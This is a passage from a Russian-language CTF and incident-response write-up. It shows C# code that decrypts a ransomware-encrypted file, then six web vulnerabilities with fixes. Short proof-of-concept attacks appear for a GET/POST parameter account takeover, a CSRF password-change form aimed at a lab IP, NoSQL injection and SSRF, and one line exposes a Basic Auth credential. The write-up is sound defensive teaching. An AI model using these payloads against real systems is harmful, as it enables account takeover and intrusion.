			<span class="token keyword">using</span> <span class="token punctuation">(</span><span class="token class-name">MemoryStream</span> memoryStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">MemoryStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token punctuation">{</span>
				<span class="token keyword">using</span> <span class="token punctuation">(</span><span class="token class-name">RijndaelManaged</span> rijndaelManaged <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">RijndaelManaged</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
				<span class="token punctuation">{</span>
					rijndaelManaged<span class="token punctuation">.</span>KeySize <span class="token operator">=</span> <span class="token number">256</span><span class="token punctuation">;</span>
					rijndaelManaged<span class="token punctuation">.</span>BlockSize <span class="token operator">=</span> <span class="token number">128</span><span class="token punctuation">;</span>
					<span class="token class-name">Rfc2898DeriveBytes</span> rfc2898DeriveBytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">Rfc2898DeriveBytes</span><span class="token punctuation">(</span>passwordBytes<span class="token punctuation">,</span> salt<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					rijndaelManaged<span class="token punctuation">.</span>Key <span class="token operator">=</span> rfc2898DeriveBytes<span class="token punctuation">.</span><span class="token function">GetBytes</span><span class="token punctuation">(</span>rijndaelManaged<span class="token punctuation">.</span>KeySize <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					rijndaelManaged<span class="token punctuation">.</span>IV <span class="token operator">=</span> rfc2898DeriveBytes<span class="token punctuation">.</span><span class="token function">GetBytes</span><span class="token punctuation">(</span>rijndaelManaged<span class="token punctuation">.</span>BlockSize <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					rijndaelManaged<span class="token punctuation">.</span>Mode <span class="token operator">=</span> CipherMode<span class="token punctuation">.</span>CBC<span class="token punctuation">;</span>
					<span class="token keyword">using</span> <span class="token punctuation">(</span><span class="token class-name">CryptoStream</span> cryptoStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">CryptoStream</span><span class="token punctuation">(</span>memoryStream<span class="token punctuation">,</span> rijndaelManaged<span class="token punctuation">.</span><span class="token function">CreateDecryptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> CryptoStreamMode<span class="token punctuation">.</span>Write<span class="token punctuation">)</span><span class="token punctuation">)</span>
					<span class="token punctuation">{</span>
						cryptoStream<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>bytesToBeEncrypted<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bytesToBeEncrypted<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span>
						cryptoStream<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token punctuation">}</span>
					result <span class="token operator">=</span> memoryStream<span class="token punctuation">.</span><span class="token function">ToArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token punctuation">}</span>
			<span class="token punctuation">}</span>
			<span class="token keyword">return</span> result<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">//byte[] src = {0x41, 0x42};</span>
        <span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> bytesToBeDecrypted <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">FromBase64String</span><span class="token punctuation">(</span><span class="token string">"pTuNtGrj6dm400ShIQtUq8IDMWG+zegd9qEpMlsdNEI="</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Important.txt.txt.p4blm</span>
		<span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> array <span class="token operator">=</span> System<span class="token punctuation">.</span>Text<span class="token punctuation">.</span>Encoding<span class="token punctuation">.</span>UTF8<span class="token punctuation">.</span><span class="token function">GetBytes</span><span class="token punctuation">(</span><span class="token string">"084b988baa7c8d98cda90c5fe603c560"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		array <span class="token operator">=</span> SHA256<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ComputeHash</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token comment">//Console.WriteLine(Convert.ToBase64String(AES_Encrypt(src,password)));</span>
        <span class="token comment">//a2/vWmVfrDfYx+Cwi7ShAA==</span>

        <span class="token class-name"><span class="token keyword">var</span></span> dbts <span class="token operator">=</span> <span class="token function">AES_Decrypt</span><span class="token punctuation">(</span>bytesToBeDecrypted<span class="token punctuation">,</span> array<span class="token punctuation">)</span><span class="token punctuation">;</span>
        Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>Convert<span class="token punctuation">.</span><span class="token function">ToBase64String</span><span class="token punctuation">(</span>dbts<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</div></div></code></pre><h1 id="Исправление-уязвимостей" data-id="Исправление-уязвимостей"><a class="anchor hidden-xs" href="#Исправление-уязвимостей" title="Исправление-уязвимостей"><span class="octicon octicon-link"></span></a><span>Исправление уязвимостей</span></h1><h2 id="Уязвимость-1" data-id="Уязвимость-1"><a class="anchor hidden-xs" href="#Уязвимость-1" title="Уязвимость-1"><span class="octicon octicon-link"></span></a><span>Уязвимость 1</span></h2><p><img src="https://i.imgur.com/1BJn3np.png" alt="" loading="lazy"></p><p><span>Перерегистрация юзера с уже сущ почтой и юзернеймом</span><br>
<span>Регистрация с любыми данными(почта не чекается по регексу + длина пароля + существовавние юзера) (файл </span><code>access.py</code><span>)</span></p><p><strong><span>Fix: Добавили чек на длину пароля и то, что данный юзер уже существует:</span></strong></p><pre><code class="python hljs"><div class="wrapper"><div class="gutter linenumber"><span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span></div><div class="code"><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_to_db</span>(<span class="hljs-params">self</span>):
    user = self._connector.db.get_user(self.username)
    <span class="hljs-keyword">if</span> user:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>  <span class="hljs-comment"># user already exist</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.password) &lt; <span class="hljs-number">8</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>  <span class="hljs-comment"># bad password length</span>
    self._connector.db.new_user(self.username, self.email, self.password, self.admin)
    self._connector.db.set_permissions(self.username, self.__export_permissions(self.permissions))
    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
</div></div></code></pre><h2 id="Уязвимость-2" data-id="Уязвимость-2"><a class="anchor hidden-xs" href="#Уязвимость-2" title="Уязвимость-2"><span class="octicon octicon-link"></span></a><span>Уязвимость 2</span></h2><p><span>Password change account takeover (смешались параметры GET и POST запросов):</span></p><pre><code class="python hljs"><span class="hljs-keyword">def</span> <span class="hljs-title function_">change_password</span>():
    user = connector.db.get_user(session[<span class="hljs-string">"user"</span>])
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(user[<span class="hljs-string">"uid"</span>]) != <span class="hljs-built_in">int</span>(request.form.get(<span class="hljs-string">'user_id'</span>)) <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> user[<span class="hljs-string">"admin"</span>]:
        <span class="hljs-keyword">return</span> make_response({<span class="hljs-string">"error"</span>:<span class="hljs-string">"Access denied"</span>}, <span class="hljs-number">403</span>)
    user_id = request.values.get(<span class="hljs-string">'user_id'</span>)
</code></pre><p><span>POC:</span></p><pre><code>POST /change_password?user_id=7
...
user_id=1&amp;password=321    
</code></pre><p><span>Fix:</span></p><pre><code class="python hljs"><div class="wrapper"><div class="gutter linenumber"><span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span></div><div class="code"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/change_password'</span>, methods=[<span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">change_password</span>():
    user = connector.db.get_user(session[<span class="hljs-string">"user"</span>])
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(user[<span class="hljs-string">"uid"</span>]) != <span class="hljs-built_in">int</span>(request.form.get(<span class="hljs-string">'user_id'</span>)) <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> user[<span class="hljs-string">"admin"</span>]:
        <span class="hljs-keyword">return</span> make_response({<span class="hljs-string">"error"</span>: <span class="hljs-string">"Access denied"</span>}, <span class="hljs-number">403</span>)
    user_id = request.form.get(<span class="hljs-string">'user_id'</span>)
    password = request.form.get(<span class="hljs-string">'password'</span>)
    <span class="hljs-keyword">if</span> connector.db.change_password(user_id, password):
        <span class="hljs-keyword">return</span> make_response({<span class="hljs-string">"status"</span>: <span class="hljs-string">"ok"</span>}, <span class="hljs-number">200</span>)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> make_response({<span class="hljs-string">"error"</span>: <span class="hljs-string">"Same password"</span>}, <span class="hljs-number">400</span>)
</div></div></code></pre><p><span>Убираем вариант запроса с GET, чтобы не дублировать функциональность (на фронтенде POST, да он и логичнее на смену пароля). Берём значения для проверки из </span><code>request.form</code><span>.</span></p><h2 id="Уязвимость-3" data-id="Уязвимость-3"><a class="anchor hidden-xs" href="#Уязвимость-3" title="Уязвимость-3"><span class="octicon octicon-link"></span></a><span>Уязвимость 3</span></h2><p><span>Методом исправления является - CORS Origin header, который позволяет выстроить ограничения на запросы различных доменов.</span><br>
<span>Также, существуют и другие альтернативы:</span></p><ol>
<li><span>Хэдер X-CSRF-Token, который устанавливает cookie раз в сессию, он работает потому, что вставляется только в клиентский JS.</span></li>
<li><span>Same Origin Policy, которое проверяет два URL’а и считает имеющим один источник,только если у них одинаковый протокол, домен и порт</span></li>
<li><span>Double Submit Cookie, идея которого в том, чтобы отдать токен клиенту двумя методами: в куках и в одном из параметров ответа.</span><br>
<a href="https://habr.com/ru/post/318748/" target="_blank" rel="noopener"><span>https://habr.com/ru/post/318748/</span></a></li>
</ol><p><strong><span>CSRF account takeover:</span></strong></p><pre><code>&lt;html&gt;&lt;form enctype="multipart/form-data" method="POST" action="http://10.10.19.110:8080/change_password"&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;user_id&lt;/td&gt;&lt;td&gt;&lt;input type="text" value="1" name="user_id"&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;password&lt;/td&gt;&lt;td&gt;&lt;input type="text" value="321" name="password"&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;input type="submit" value="http://10.10.19.110:8080/change_password"&gt;&lt;/form&gt;&lt;/html&gt;
</code></pre><p><span>Fix:</span></p><pre><code class="python hljs"><div class="wrapper"><div class="gutter linenumber"><span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span></div><div class="code"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CORSMiddleware</span>(<span class="hljs-title class_ inherited__">BaseHTTPMiddleware</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-built_in">super</span>().__init__()

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">dispatch</span>(<span class="hljs-params">self, request, call_next</span>):
        <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">'OPTIONS'</span>:
            response = call_next(request)
            response.headers.add(<span class="hljs-string">"Access-Control-Allow-Origin"</span>, <span class="hljs-string">"null"</span>)
            <span class="hljs-keyword">return</span> response
        <span class="hljs-keyword">if</span> <span class="hljs-string">'Origin'</span> <span class="hljs-keyword">in</span> request.headers:
            <span class="hljs-keyword">if</span> request.headers[<span class="hljs-string">'Origin'</span>] == <span class="hljs-string">'http://10.10.19.110:8080'</span>:
                response = call_next(request)
                <span class="hljs-keyword">return</span> response
            <span class="hljs-keyword">else</span>:
                <span class="hljs-keyword">return</span> make_response({<span class="hljs-string">"error"</span>: <span class="hljs-string">"CORS BAN!"</span>}, <span class="hljs-number">403</span>)
        response = call_next(request)
        <span class="hljs-keyword">return</span> response
...
app.wsgi_app.add_middleware(CORSMiddleware)

</div></div></code></pre><p><img src="https://i.imgur.com/DhKKv0u.png" alt="" loading="lazy"></p><h2 id="Уязвимость-4" data-id="Уязвимость-4"><a class="anchor hidden-xs" href="#Уязвимость-4" title="Уязвимость-4"><span class="octicon octicon-link"></span></a><span>Уязвимость 4</span></h2><h3 id="NoSQL-injection" data-id="NoSQL-injection"><a class="anchor hidden-xs" href="#NoSQL-injection" title="NoSQL-injection"><span class="octicon octicon-link"></span></a><span>NoSQL injection:</span></h3><pre><code class="python hljs">{<span class="hljs-string">"$where"</span>: <span class="hljs-string">f"this.username == '<span class="hljs-subst">{username}</span>' &amp;&amp; this.password == '<span class="hljs-subst">{hashed}</span>'"</span>}
</code></pre><p><span>Небезопасный string formatting</span><br>
<span>Для того, чтобы исключить присутсвие данной уязвимости, требуется реализовать логику проверки иначе, т.к. нереляционный тип баз данных часто подверджен атакам из-за меньшего колличество ограничений у запросов, а также большей гибкости.</span><br>
<span>Более простой альтернативой является фильтрация username (т.к. только оно - user-controlled параметр в запросе к MongoDB).</span><br>
<span>Fix в метод </span><code>register</code><span> (на создании юзера):</span></p><pre><code class="python hljs">whitelist = string.ascii_letters + string.digits + <span class="hljs-string">'_@!$-:;'</span>
<span class="hljs-keyword">for</span> sym <span class="hljs-keyword">in</span> username:
    <span class="hljs-keyword">if</span> sym <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> whitelist:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>  <span class="hljs-comment"># bad username symbol</span>
</code></pre><p><img src="https://i.imgur.com/AEQzkKX.png" alt="" loading="lazy"></p><h2 id="Уязвимость-5" data-id="Уязвимость-5"><a class="anchor hidden-xs" href="#Уязвимость-5" title="Уязвимость-5"><span class="octicon octicon-link"></span></a><span>Уязвимость 5</span></h2><p><span>SET_PERMISSIONS ENDPOINT</span></p><pre><code class="python hljs"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/set_permissions'</span>, methods=[<span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">set_permissions</span>():
    ... (можно менять permissions любому юзеру, не имея админских прав)
</code></pre><p><span>Fix:</span></p><pre><code class="pyt hljs"><div class="wrapper"><div class="gutter linenumber"><span></span>
<span></span>
<span></span>
<span></span></div><div class="code"><span class="hljs-variable">@app</span>.route(<span class="hljs-string">'/set_permissions'</span>, methods=[<span class="hljs-string">'POST'</span>])
<span class="hljs-variable">@access</span>.is_admin
def set_permissions():
    ...
</div></div></code></pre><h2 id="Уязвимость-6" data-id="Уязвимость-6"><a class="anchor hidden-xs" href="#Уязвимость-6" title="Уязвимость-6"><span class="octicon octicon-link"></span></a><span>Уязвимость 6</span></h2><p><span>SSRF</span><br>
<span>Включаем листенер</span><br>
<span>Устанавливаем урл для отстука</span><br>
<img src="https://i.imgur.com/5jEIGez.png" alt="" loading="lazy"><br>
<span>Записываем свой пейлоад</span><br>
<img src="https://i.imgur.com/yZpQ5aj.png" alt="" loading="lazy"><br>
<span>Видим запрос от сервера на указанный адрес</span><br>
<img src="https://i.imgur.com/8qPmlRU.png" alt="" loading="lazy"><br>
<span>Мы полностью контроллируем тело запроса с помощью base64 пейлоада.</span><br>
<span>Скрин, где мы получили свой контент, а не null в поле result.</span><br>
<img src="https://i.imgur.com/dYfzeyJ.png" alt="" loading="lazy"></p><pre><code class="python hljs"><div class="wrapper"><div class="gutter linenumber"><span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span></div><div class="code"><span class="hljs-keyword">import</span> http.server
<span class="hljs-keyword">import</span> socketserver
<span class="hljs-keyword">from</span> http <span class="hljs-keyword">import</span> HTTPStatus


<span class="hljs-keyword">class</span> <span class="hljs-title class_">Handler</span>(http.server.SimpleHTTPRequestHandler):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_POST</span>(<span class="hljs-params">self</span>):
        self.send_response(HTTPStatus.OK)
        self.end_headers()
        self.wfile.write(<span class="hljs-string">b'{"a":"hello"}'</span>)


httpd = socketserver.TCPServer((<span class="hljs-string">'0.0.0.0'</span>, <span class="hljs-number">4002</span>), Handler)
httpd.serve_forever()
</div></div></code></pre><p><strong><span>FIX</span></strong><span>:</span><br>
<span>Для фикса SSRF чаще всего есть два пути (фильтровать нельзя из-за кучи байпасов, reflected SSRF через redirect и т.д.):</span><br>
<span>1) Изолировать сервер, с которого идут запросы, если ему жизненно необходимо делать запросы на пользовательские урлы</span><br>
<span>2) Избежать этого функционала, по возможности, или если нет возможности изолировать.</span><br>
<span>В данной ситуации лучше подходит второй способ, как мы и сделали</span><br>
<img src="https://i.imgur.com/FHaWwNl.png" alt="" loading="lazy"><br>
<span>Кроме того, SSRF не дает эксплуатировать WAF(но waf можно забайпасить, так что фикс необходим).</span></p><hr><p><span>Кроме того были найдены dos уязвимости, однако они не могут эксплуатироваться для нанесения достаточного ущерба/изменения/получения информации.</span></p><p><span>Dos уязвимости почти всегда принимаются как информативные(некритичные, не угрожающие безопасности сайта)</span></p><hr><h2 id="WAF" data-id="WAF"><a class="anchor hidden-xs" href="#WAF" title="WAF"><span class="octicon octicon-link"></span></a><span>WAF</span></h2><p><span>Также использовали </span><strong><span>Web Application Firewall</span></strong><span> ModSecurity для Nginx с OWASP Core Rule Set, он осуществляет поиск не по регулярным выражениям, а по core rules’ам (</span><a href="https://github.com/coreruleset/modsecurity-crs-docker/" target="_blank" rel="noopener"><span>https://github.com/coreruleset/modsecurity-crs-docker/</span></a><span>).</span><br>
<strong><span>Это позволило нам закрыть множество попыток эксплуатации уязвимости со стороны чекера, не выявленных на стадии анализа кода.</span></strong><span> Например, попытки SQL инъекций</span><br>
<img src="https://i.imgur.com/LNFv1rg.png" alt="" loading="lazy"></p><p><span>Basic Auth: </span><code>xss:n5fptvc7CWwjlgJkU8F2</code></p><h1 id="Вывод" data-id="Вывод"><a class="anchor hidden-xs" href="#Вывод" title="Вывод"><span class="octicon octicon-link"></span></a><span>Вывод</span></h1><p><span>В результате проделанной работы по нахождению и устранению уязвимостей ещё раз подтвердился факт того, что большинство взломов происходят из-за “человеческого фактора” (любитель майнкрафта и отец, который не изолировал рабочее пространство от личного).</span><br>
<span>Также, обыкновенным пользователям, как Валера, следует надеяться не только на антивирусы и фаерволы, но и отдавать отчет своим действиям.</span><br>
<strong><span>Таким образом, мы успешно провели расследование, выполнив все этапы и защитив уязвимое приложение от атак.</span></strong></p><h1 id="Как-предотвратить-подобные-инциденты" data-id="Как-предотвратить-подобные-инциденты"><a class="anchor hidden-xs" href="#Как-предотвратить-подобные-инциденты" title="Как-предотвратить-подобные-инциденты"><span class="octicon octicon-link"></span></a><span>Как предотвратить подобные инциденты?</span></h1><p><span>В настоящее время широко распространяется принцип Zero Trust, т.е. нет никаких “доверенных” ролей, каждый пользователь или устройство должны подтверждать свои данные каждый раз, когда они запрашивают доступ к какому-либо ресурсу внутри или за пределами сети. Необходимо выдавать минимальное кол-во правил, необходимых для работы (в отношении </span><strong><span>ВСЕХ</span></strong><span> сотрудников, включая начальство).</span><br>
<span>Обязательно использовать технологию </span><strong><span>VPN</span></strong><span> для доступа к корпоративным ресурсам (доступ к самому VPN также защищается 2FA). Логическое развитие VPN - </span><strong><span>ZTNA</span></strong><span> (Zero Trust Network Access), реализующая микроконтроль до каждого ресурса (гибкие роли пользователей). В случае взлома одного из пользователей в ZTNA осложняется Lateral Movement.</span><br>
<span>Также не нужно забывать и про организационные меры, такие, как тестирование сотрудников фишинговыми письмами и </span><strong><span>строгой политикой доступа</span></strong><span>.</span></p><p><span>Также сейчас изменяется стандартная модель “доступность, целостность, конфеденциальность” в плане первых двух пунктов: технология контейнеризации и построенный на ней подход “инфраструктура как код” меняет отношение к имеющимся ресурсам. Например, раньше ставили main worker сайта на один сервер, базу данных на другой. Это были конкретные ресурсы, конкретные сервера с конкретными характеристиками. Теперь же это ресурсы временные, они могут быть на одном железе, а через час - уже даже в другом датацентре (автоскейлинг). Соответственно, риск отсутствия доступности (“новая версия косячит, а старая не поднимается!” =&gt; в любой момент можем вернуться, выкатка новой идёт не сразу на весь масштаб; тестовые инфраструктуры) и целостности (“файл базы данных был удалён каким-то кривым скриптом!” =&gt; база-данных-сущность (не просто файл) явно защищена от случайного удаления, нужно его подтверждать).</span></p></div>
    <div class="ui-toc dropup unselectable hidden-print" style="display:none;">
        <div class="pull-right dropdown">
            <a id="tocLabel" class="ui-toc-label btn btn-default" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false" title="Table of content">
                <i class="fa fa-bars"></i>
            </a>
            <ul id="ui-toc" class="ui-toc-dropdown dropdown-menu" aria-labelledby="tocLabel">
                <div class="toc"><ul class="nav">
<li class=""><a href="#Qualitas-incident-report-НТО-2023" title="Qualitas incident report НТО-2023">Qualitas incident report НТО-2023</a><ul class="nav">
<li class=""><a href="#Выполнили" title="Выполнили">Выполнили</a></li>
<li class=""><a href="#Github" title="Github">Github</a></li>
<li class=""><a href="#Содержание" title="Содержание">Содержание</a></li>
</ul>
</li>
<li class=""><a href="#Таски" title="Таски">Таски</a><ul class="nav">
<li class=""><a href="#PWN-10" title="PWN-10">PWN-10</a></li>
<li><a href="#Reverse-10" title="Reverse-10">Reverse-10</a></li>
<li><a href="#Reverse-20" title="Reverse-20">Reverse-20</a></li>
<li><a href="#Web-10" title="Web-10">Web-10</a></li>
<li><a href="#Web-20" title="Web-20">Web-20</a></li>
<li><a href="#Crypto-10" title="Crypto-10">Crypto-10</a></li>
</ul>
</li>
<li><a href="#tip1" title=""></a><ul class="nav">
<li><a href="#Crypto-20" title="Crypto-20">Crypto-20</a></li>
<li><a href="#Crypto-30" title="Crypto-30">Crypto-30</a></li>
</ul>
</li>
<li><a href="#Машина-1" title="Машина 1">Машина 1</a><ul class="nav">
<li><a href="#Как-злоумышленник-попал-на-машину" title="Как злоумышленник попал на машину?">Как злоумышленник попал на машину?</a></li>
<li><a href="#Как-повысил-свои-права" title="Как повысил свои права?">Как повысил свои права?</a></li>
<li><a href="#Как-злоумышленник-узнал-пароль-от-passwordskdbx-" title="Как злоумышленник узнал пароль от passwords.kdbx ?">Как злоумышленник узнал пароль от passwords.kdbx ?</a></li>
<li><a href="#Куда-logkeys-пишет-логи-" title="Куда logkeys пишет логи ?">Куда logkeys пишет логи ?</a></li>
<li><a href="#Пароль-от-чего-лежит-в-passwordskdbx" title="Пароль от чего лежит в passwords.kdbx?">Пароль от чего лежит в passwords.kdbx?</a></li>
</ul>
</li>
<li><a href="#Машина-2" title="Машина 2">Машина 2</a><ul class="nav">
<li><a href="#Какой-пароль-от-Ransomware" title="Какой пароль от Ransomware?">Какой пароль от Ransomware?</a></li>
<li><a href="#Какие-процессы-в-системе-являются-вредоносными" title="Какие процессы в системе являются вредоносными?">Какие процессы в системе являются вредоносными?</a></li>
<li><a href="#Как-произошла-доставка-вредоносного-ПО" title="Как произошла доставка вредоносного ПО?">Как произошла доставка вредоносного ПО?</a></li>
<li><a href="#Какие-средства-обфускации-были-использованы" title="Какие средства обфускации были использованы?">Какие средства обфускации были использованы?</a></li>
<li><a href="#Как-злоумышленник-нашел-учетные-данные-от-Web-сервиса" title="Как злоумышленник нашел учетные данные от Web-сервиса?">Как злоумышленник нашел учетные данные от Web-сервиса?</a></li>
</ul>
</li>
<li><a href="#Исправление-уязвимостей" title="Исправление уязвимостей">Исправление уязвимостей</a><ul class="nav">
<li><a href="#Уязвимость-1" title="Уязвимость 1">Уязвимость 1</a></li>
<li><a href="#Уязвимость-2" title="Уязвимость 2">Уязвимость 2</a></li>
<li><a href="#Уязвимость-3" title="Уязвимость 3">Уязвимость 3</a></li>
<li><a href="#Уязвимость-4" title="Уязвимость 4">Уязвимость 4</a><ul class="nav">
<li><a href="#NoSQL-injection" title="NoSQL injection:">NoSQL injection:</a></li>
</ul>
</li>
<li><a href="#Уязвимость-5" title="Уязвимость 5">Уязвимость 5</a></li>
<li><a href="#Уязвимость-6" title="Уязвимость 6">Уязвимость 6</a></li>
<li><a href="#WAF" title="WAF">WAF</a></li>
</ul>
</li>
<li><a href="#Вывод" title="Вывод">Вывод</a></li>
<li><a href="#Как-предотвратить-подобные-инциденты" title="Как предотвратить подобные инциденты?">Как предотвратить подобные инциденты?</a></li>
</ul>
</div><div class="toc-menu"><a class="expand-toggle" href="#">Expand all</a><a class="back-to-top" href="#">Back to top</a><a class="go-to-bottom" href="#">Go to bottom</a></div>
            </ul>
        </div>
    </div>
    <div id="ui-toc-affix" class="ui-affix-toc ui-toc-dropdown unselectable hidden-print" data-spy="affix" style="top:17px;display:none;" null null>
        <div class="toc"><ul class="nav">
<li class=""><a href="#Qualitas-incident-report-НТО-2023" title="Qualitas incident report НТО-2023">Qualitas incident report НТО-2023</a><ul class="nav">
<li class=""><a href="#Выполнили" title="Выполнили">Выполнили</a></li>
<li class=""><a href="#Github" title="Github">Github</a></li>
<li class=""><a href="#Содержание" title="Содержание">Содержание</a></li>
</ul>
</li>
<li class=""><a href="#Таски" title="Таски">Таски</a><ul class="nav">
<li class=""><a href="#PWN-10" title="PWN-10">PWN-10</a></li>
<li><a href="#Reverse-10" title="Reverse-10">Reverse-10</a></li>
<li><a href="#Reverse-20" title="Reverse-20">Reverse-20</a></li>
<li><a href="#Web-10" title="Web-10">Web-10</a></li>
<li><a href="#Web-20" title="Web-20">Web-20</a></li>
<li><a href="#Crypto-10" title="Crypto-10">Crypto-10</a></li>
</ul>
</li>
<li><a href="#tip1" title=""></a><ul class="nav">
<li><a href="#Crypto-20" title="Crypto-20">Crypto-20</a></li>
<li><a href="#Crypto-30" title="Crypto-30">Crypto-30</a></li>
</ul>
</li>
<li><a href="#Машина-1" title="Машина 1">Машина 1</a><ul class="nav">
<li><a href="#Как-злоумышленник-попал-на-машину" title="Как злоумышленник попал на машину?">Как злоумышленник попал на машину?</a></li>
<li><a href="#Как-повысил-свои-права" title="Как повысил свои права?">Как повысил свои права?</a></li>
<li><a href="#Как-злоумышленник-узнал-пароль-от-passwordskdbx-" title="Как злоумышленник узнал пароль от passwords.kdbx ?">Как злоумышленник узнал пароль от passwords.kdbx ?</a></li>
<li><a href="#Куда-logkeys-пишет-логи-" title="Куда logkeys пишет логи ?">Куда logkeys пишет логи ?</a></li>
<li><a href="#Пароль-от-чего-лежит-в-passwordskdbx" title="Пароль от чего лежит в passwords.kdbx?">Пароль от чего лежит в passwords.kdbx?</a></li>
</ul>
</li>
<li><a href="#Машина-2" title="Машина 2">Машина 2</a><ul class="nav">
<li><a href="#Какой-пароль-от-Ransomware" title="Какой пароль от Ransomware?">Какой пароль от Ransomware?</a></li>
<li><a href="#Какие-процессы-в-системе-являются-вредоносными" title="Какие процессы в системе являются вредоносными?">Какие процессы в системе являются вредоносными?</a></li>
<li><a href="#Как-произошла-доставка-вредоносного-ПО" title="Как произошла доставка вредоносного ПО?">Как произошла доставка вредоносного ПО?</a></li>
<li><a href="#Какие-средства-обфускации-были-использованы" title="Какие средства обфускации были использованы?">Какие средства обфускации были использованы?</a></li>
<li><a href="#Как-злоумышленник-нашел-учетные-данные-от-Web-сервиса" title="Как злоумышленник нашел учетные данные от Web-сервиса?">Как злоумышленник нашел учетные данные от Web-сервиса?</a></li>
</ul>
</li>
<li><a href="#Исправление-уязвимостей" title="Исправление уязвимостей">Исправление уязвимостей</a><ul class="nav">
<li><a href="#Уязвимость-1" title="Уязвимость 1">Уязвимость 1</a></li>
<li><a href="#Уязвимость-2" title="Уязвимость 2">Уязвимость 2</a></li>
<li><a href="#Уязвимость-3" title="Уязвимость 3">Уязвимость 3</a></li>
<li><a href="#Уязвимость-4" title="Уязвимость 4">Уязвимость 4</a><ul class="nav">
<li><a href="#NoSQL-injection" title="NoSQL injection:">NoSQL injection:</a></li>
</ul>
</li>
<li><a href="#Уязвимость-5" title="Уязвимость 5">Уязвимость 5</a></li>
<li><a href="#Уязвимость-6" title="Уязвимость 6">Уязвимость 6</a></li>
<li><a href="#WAF" title="WAF">WAF</a></li>
</ul>
</li>
<li><a href="#Вывод" title="Вывод">Вывод</a></li>
<li><a href="#Как-предотвратить-подобные-инциденты" title="Как предотвратить подобные инциденты?">Как предотвратить подобные инциденты?</a></li>
</ul>
</div><div class="toc-menu"><a class="expand-toggle" href="#">Expand all</a><a class="back-to-top" href="#">Back to top</a><a class="go-to-bottom" href="#">Go to bottom</a></div>
    </div>
